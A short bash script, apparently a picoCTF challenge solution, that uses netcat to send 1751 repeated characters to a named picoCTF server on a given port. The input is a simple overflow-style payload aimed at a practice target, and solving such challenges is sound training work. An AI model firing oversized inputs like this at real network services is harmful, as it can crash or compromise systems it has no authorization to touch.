#!/bin/bash

#$1 should be given as an argument to the script
# it corresponds to the netcat port number


python3 -c 'print("e"*1751)' | nc foggy-cliff.picoctf.net $1